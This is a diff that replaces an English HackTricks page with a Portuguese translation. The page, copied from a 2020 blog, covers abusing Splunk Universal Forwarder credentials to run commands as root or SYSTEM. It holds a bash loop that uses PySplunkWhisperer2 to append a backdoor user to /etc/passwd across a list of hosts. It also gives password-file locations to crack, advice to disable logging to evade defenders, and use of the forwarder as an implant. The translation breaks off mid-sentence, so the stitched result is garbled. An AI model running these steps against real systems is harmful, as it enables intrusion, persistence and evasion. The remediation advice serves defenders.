@@ -1,184 +1,91 @@
+Se você está fazendo uma enumeração interna ou externa de uma máquina e encontra o Splunk em execução (porta 8090), se você tiver sorte e souber de quaisquer credenciais válidas, poderá abusar do serviço Splunk para executar um shell como o usuário que está executando o Splunk. Se o root estiver executando, você pode elevar os privilégios para root.
 
+Além disso, se você já é root e o serviço Splunk não está ouvindo apenas em localhost, você pode roubar o arquivo de senha do serviço Splunk e quebrar as senhas ou adicionar novas credenciais a ele. E manter a persistência no host.
 
-<details>
+Na primeira imagem abaixo, você pode ver como se parece uma página da web do Splunkd.
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+As seguintes informações foram copiadas de https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+# Abusando dos Splunk Forwarders para shells e persistência
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+14 de agosto de 2020
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+## Descrição:
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+O agente Splunk Universal Forwarder (UF) permite que usuários remotos autenticados enviem comandos ou scripts únicos para os agentes por meio da API Splunk. O agente UF não valida as conexões que estão vindo de um servidor Splunk Enterprise válido, nem valida o código que está assinado ou comprovado de outra forma para ser do servidor Splunk Enterprise. Isso permite que um invasor que obtenha acesso à senha do agente UF execute código arbitrário no servidor como SYSTEM ou root, dependendo do sistema operacional.
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+Este ataque está sendo usado por testadores de penetração e provavelmente está sendo ativamente explorado na natureza por atacantes mal-intencionados. Obter a senha pode levar à comprometimento de centenas de sistemas em um ambiente do cliente.
 
-</details>
+As senhas do Splunk UF são relativamente fáceis de adquirir, consulte a seção Locais comuns de senha para obter detalhes.
 
+## Contexto:
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+O Splunk é uma ferramenta de agregação e pesquisa de dados frequentemente usada como um sistema de monitoramento de informações e eventos de segurança (SIEM). O Splunk Enterprise Server é um aplicativo da web que é executado em um servidor, com agentes, chamados de Universal Forwarders, que são instalados em cada sistema na rede. O Splunk fornece binários de agente para Windows, Linux, Mac e Unix. Muitas organizações usam o Syslog para enviar dados para o Splunk em vez de instalar um agente em hosts Linux / Unix, mas a instalação do agente está se tornando cada vez mais popular.
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+O Universal Forwarder é acessível em cada host em https://host:8089. O acesso a qualquer uma das chamadas de API protegidas, como /service/, exibe uma caixa de autenticação básica. O nome de usuário é sempre admin e a senha padrão costumava ser changeme até 2016, quando o Splunk exigiu que todas as novas instalações definissem uma senha de 8 caracteres ou mais. Como você notará em minha demonstração, a complexidade não é um requisito, pois a senha do meu agente é 12345678. Um atacante remoto pode forçar a senha sem bloqueio, o que é uma necessidade de um host de log, pois se a conta for bloqueada, os logs não seriam mais enviados para o servidor Splunk e um atacante poderia usar isso para ocultar seus ataques. A seguinte captura de tela mostra o agente Universal Forwarder, esta página inicial é acessível sem autenticação e pode ser usada para enumerar hosts que executam o Universal Forwarder do Splunk.
 
-In the first  image below you can see how a Splunkd web page looks like.
+![0](https://eapolsniper.github.io/assets/2020AUG14/11_SplunkAgent.png)
 
-**The following information was copied from** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
+A documentação do Splunk mostra o uso da mesma senha de encaminhamento universal para todos os agentes, não me lembro com certeza se isso é um requisito ou se senhas individuais podem ser definidas para cada agente, mas com base na documentação e na memória de quando eu era um administrador do Splunk, acredito que todos os agentes devem usar a mesma senha. Isso significa que, se a senha for encontrada ou quebrada em um sistema, é provável que funcione em todos os hosts do Splunk UF. Essa foi minha experiência pessoal, permitindo a comprometimento de centenas de hosts rapidamente.
 
-# Abusing Splunk Forwarders For Shells and Persistence
+## Locais comuns de senha
 
-14 Aug 2020
+Com frequência, encontro a senha de texto simples do agente de encaminhamento universal do Splunk nos seguintes locais em redes:
 
-## Description: <a href="#description" id="description"></a>
+1. Diretório Scripts do Sysvol / domain.com / do Active Directory. Os administradores armazenam o executável e a senha juntos para uma instalação eficiente do agente.
+2. Compartilhamentos de arquivos de rede que hospedam arquivos de instalação de TI
+3. Wiki ou outros repositórios de notas de compilação na rede interna
 
-The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesn’t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.
+A senha também pode ser acessada em forma de hash em Program Files \ Splunk \ etc \ passwd em hosts Windows e em / opt / Splunk / etc / passwd em hosts Linux e Unix. Um invasor pode tentar quebrar a senha usando o Hashcat ou alugar um ambiente de quebra de nuvem para aumentar a probabilidade de quebrar o hash. A senha é um hash SHA-256 forte e, como tal, é improvável que uma senha forte e aleatória seja quebrada.
 
-This attack is being used by Penetration Testers and is likely being actively exploited in the wild by malicious attackers. Gaining the password could lead to the compromise of hundreds of system in a customer environment.
+## Impacto:
 
-Splunk UF passwords are relatively easy to acquire, see the secion Common Password Locations for details.
+Um invasor com uma senha do agente de encaminhamento universal do Splunk pode comprometer totalmente todos os hosts do Splunk na rede e obter permissões de nível SYSTEM ou root em cada host. Eu usei com sucesso o agente Splunk em hosts Windows, Linux e Solaris Unix. Essa vulnerabilidade pode permitir que as credenciais do sistema sejam despejadas, que dados confidenciais sejam exfiltrados ou que ransomware seja instalado. Essa vulnerabilidade é rápida, fácil de usar e confiável.
 
-## Context: <a href="#context" id="context"></a>
+Como o Splunk lida com logs, um invasor pode reconfigurar o encaminhamento universal na primeira execução de comando para alterar a localização do encaminhamento, desativando o registro no SIEM Splunk. Isso reduziria drasticamente as chances de ser pego pela equipe Blue do cliente.
 
-Splunk is a data aggregation and search tool often used as a Security Information and Event Monitoring (SIEM) system. Splunk Enterprise Server is a web application which runs on a server, with agents, called Universal Forwarders, which are installed on every system in the network. Splunk provides agent binaries for Windows, Linux, Mac, and Unix. Many organizations use Syslog to send data to Splunk instead of installing an agent on Linux/Unix hosts but agent installation is becomming increasingly popular.
-
-Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher. As you will note in my demo, complexity is not a requirement as my agent password is 12345678. A remote attacker can brute force the password without lockout, which is a necessity of a log host, since if the account locked out then logs would no longer be sent to the Splunk server and an attacker could use this to hide their attacks. The following screenshot shows the Universal Forwarder agent, this initial page is accessible without authentication and can be used to enumerate hosts running Splunk Universal Forwarder.
-
-![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)
-
-Splunk documentaiton shows using the same Universal Forwarding password for all agents, I don’t remember for sure if this is a requirement or if individual passwords can be set for each agent, but based on documentaiton and memory from when I was a Splunk admin, I believe all agents must use the same password. This means if the password is found or cracked on one system, it is likely to work on all Splunk UF hosts. This has been my personal experience, allowing compromise of hundreds of hosts quickly.
-
-## Common Password Locations <a href="#common-password-locations" id="common-password-locations"></a>
-
-I often find the Splunk Universal Forwarding agent plain text password in the following locations on networks:
-
-1. Active Directory Sysvol/domain.com/Scripts directory. Administrators store the executible and the password together for efficient agent installation.
-2. Network file shares hosting IT installation files
-3. Wiki or other build note repositories on internal network
-
-The password can also be accessed in hashed form in Program Files\Splunk\etc\passwd on Windows hosts, and in /opt/Splunk/etc/passwd on Linux and Unix hosts. An attacker can attempt to crack the password using Hashcat, or rent a cloud cracking environment to increase liklihood of cracking the hash. The password is a strong SHA-256 hash and as such a strong, random password is unlikely to be cracked.
-
-## Impact: <a href="#impact" id="impact"></a>
-
-An attacker with a Splunk Universal Forward Agent password can fully compromise all Splunk hosts in the network and gain SYSTEM or root level permissions on each host. I have successfully used the Splunk agent on Windows, Linux, and Solaris Unix hosts. This vulnerability could allow system credentials to be dumped, sensitive data to be exfiltrated, or ransomware to be installed. This vulnerability is fast, easy to use, and reliable.
-
-Since Splunk handles logs, an attacker could reconfigure the Universal Forwarder on the first command run to change the Forwarder location, disabling logging to the Splunk SIEM. This would drastically reduce the chances of being caught by the client Blue Team.
-
-Splunk Universal Forwarder is often seen installed on Domain Controllers for log collection, which could easily allow an attacker to extract the NTDS file, disable antivirus for further exploitation, and/or modify the domain.
-
-Finally, the Universal Forwarding Agent does not require a license, and can be configured with a password stand alone. As such an attacker can install Universal Forwarder as a backdoor persistence mechanism on hosts, since it is a legitimate application which customers, even those who do not use Splunk, are not likely to remove.
-
-## Evidence: <a href="#evidence" id="evidence"></a>
-
-To show an exploitation example I set up a test environment using the latest Splunk version for both the Enterprise Server and the Universal Forwarding agent. A total of 10 images have been attached to this report, showing the following:
-
-1- Requesting the /etc/passwd file through PySplunkWhisper2
-
-![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)
-
-2- Receiving the /etc/passwd file on the attacker system through Netcat
-
-![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)
-
-3- Requesting the /etc/shadow file through PySplunkWhisper2
-
-![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)
-
-4- Receiving the /etc/shadow file on the attacker system through Netcat
-
-![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)
-
-5- Adding the user attacker007 to the /etc/passwd file
-
-![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)
-
-6- Adding the user attacker007 to the /etc/shadow file
-
-![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)
-
-7- Receiving the new /etc/shadow file showing attacker007 is successfully added
-
-![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)
-
-8- Confirming SSH access to the victim using the attacker007 account
-
-![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)
-
-9- Adding a backdoor root account with username root007, with the uid/gid set to 0
-
-![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)
-
-10- Confirming SSH access using attacker007, and then escalating to root using root007
-
-![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)
-
-At this point I have persistent access to the host both through Splunk and through the two user accounts created, one of which provides root. I can disable remote logging to cover my tracks and continue attacking the system and network using this host.
-
-Scripting PySplunkWhisperer2 is very easy and effective.
-
-1. Create a file with IP’s of hosts you want to exploit, example name ip.txt
-2. Run the following:
-
+O Universal Forwarder do Splunk é frequentemente visto instalado em controladores de domínio para coleta de log, o que poderia permitir facilmente que um invasor extraísse o arquivo NTDS, desativasse o antivírus para uma exploração ad
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
+Informações do host:
 
-Host information:
+Servidor Splunk Enterprise: 192.168.42.114\
+Vítima do agente Splunk Forwarder: 192.168.42.98\
+Atacante: 192.168.42.51
 
-Splunk Enterprise Server: 192.168.42.114\
-Splunk Forwarder Agent Victim: 192.168.42.98\
-Attacker:192.168.42.51
+Versão do Splunk Enterprise: 8.0.5 (a mais recente em 12 de agosto de 2020 - dia da configuração do laboratório)\
+Versão do Universal Forwarder: 8.0.5 (a mais recente em 12 de agosto de 2020 - dia da configuração do laboratório)
 
-Splunk Enterprise version: 8.0.5 (latest as of August 12, 2020 – day of lab setup)\
-Universal Forwarder version: 8.0.5 (latest as of August 12, 2020 – day of lab setup)
+### Recomendações de remediação para a Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>
 
-### Remediation Recommendation’s for Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>
+Recomendo a implementação de todas as seguintes soluções para fornecer defesa em profundidade:
 
-I recommend implementing all of the following solutions to provide defense in depth:
+1. Idealmente, o agente Universal Forwarder não teria uma porta aberta, mas sim consultaria o servidor Splunk em intervalos regulares para obter instruções.
+2. Ative a autenticação mútua TLS entre os clientes e o servidor, usando chaves individuais para cada cliente. Isso forneceria segurança bidirecional muito alta entre todos os serviços Splunk. A autenticação mútua TLS está sendo amplamente implementada em agentes e dispositivos IoT, este é o futuro da comunicação confiável do cliente do dispositivo com o servidor.
+3. Envie todo o código, arquivos de script ou de uma única linha em um arquivo compactado que esteja criptografado e assinado pelo servidor Splunk. Isso não protege os dados do agente enviados por meio da API, mas protege contra a execução remota de código malicioso de terceiros.
 
-1. Ideally, the Universal Forwarder agent would not have a port open at all, but rather would poll the Splunk server at regular intervals for instructions.
-2. Enable TLS mutual authentication between the clients and server, using individual keys for each client. This would provide very high bi-directional security between all Splunk services. TLS mutual authentication is being heavily implemented in agents and IoT devices, this is the future of trusted device client to server communication.
-3. Send all code, single line or script files, in a compressed file which is encrypted and signed by the Splunk server. This does not protect the agent data sent through the API, but protects against malicious Remote Code Execution from a 3rd party.
+### Recomendações de remediação para clientes da Splunk: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>
 
-### Remediation Recommendation’s for Splunk customers: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>
+1. Certifique-se de que uma senha muito forte seja definida para os agentes Splunk. Recomendo pelo menos uma senha aleatória de 15 caracteres, mas como essas senhas nunca são digitadas, isso pode ser definido como uma senha muito grande, como 50 caracteres.
+2. Configure firewalls baseados em host para permitir apenas conexões com a porta 8089/TCP (porta do agente Universal Forwarder) do servidor Splunk.
 
-1. Ensure a very strong password is set for Splunk agents. I recommend at least a 15-character random password, but since these passwords are never typed this could be set to a very large password such as 50 characters.
-2. Configure host based firewalls to only allow connections to port 8089/TCP (Universal Forwarder Agent’s port) from the Splunk server.
+## Recomendações para Red Team: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>
 
-## Recommendations for Red Team: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>
+1. Baixe uma cópia do Splunk Universal Forwarder para cada sistema operacional, pois é um ótimo implante leve e assinado. É bom manter uma cópia caso a Splunk realmente corrija isso.
 
-1. Download a copy of Splunk Universal Forwarder for each operating system, as it is a great light weight signed implant. Good to keep a copy incase Splunk actually fixes this.
+## Explorações/Blogs de outros pesquisadores <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>
 
-## Exploits/Blogs from other researchers <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>
-
-Usable public exploits:
+Explorações públicas utilizáveis:
 
 * https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 * https://www.exploit-db.com/exploits/46238
 * https://www.exploit-db.com/exploits/46487
 
-Related blog posts:
+Postagens de blog relacionadas:
 
 * https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
 * https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
 * https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool
 
-_** Note: **_ This issue is a serious issue with Splunk systems and it has been exploited by other testers for years. While Remote Code Execution is an intended feature of Splunk Universal Forwarder, the implimentaion of this is dangerous. I attempted to submit this bug via Splunk’s bug bounty program in the very unlikely chance they are not aware of the design implications, but was notified that any bug submissions implement the Bug Crowd/Splunk disclosure policy which states no details of the vulnerability may be discussed publically _ever_ without Splunk’s permission. I requested a 90 day disclosure timeline and was denied. As such, I did not responsibly disclose this since I am reasonably sure Splunk is aware of the issue and has chosen to ignore it, I feel this could severely impact companies, and it is the responsibility of the infosec community to educate businesses.
-
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-
+_**Nota:**_ Este problema é um problema sério com sistemas Splunk e tem sido explorado por outros testadores há anos. Embora a execução remota de código seja um recurso pretendido do Splunk Universal Forwarder, a implementação disso é perigosa. Tentei enviar esse bug por meio do programa de recompensa por bugs da Splunk na muito improvável chance de que eles não estejam cientes das implicações de design, mas fui notificado de que todas as submissões de bugs implementam a política de divulgação Bug Crowd/Splunk que afirma que nenhum detalhe da vulnerabilidade pode ser discutido publicamente _nunca_ sem a permissão da Splunk. Solicitei um prazo de divulgação de 90 dias e fui negado. Como tal, não divulguei isso de forma responsável, já que estou razoavelmente certo de que a Splunk está ciente do problema e optou por ignorá-lo, sinto que isso poderia afetar gravemente as empresas e é responsabilidade da comunidade de segurança da informação educar as empresas.
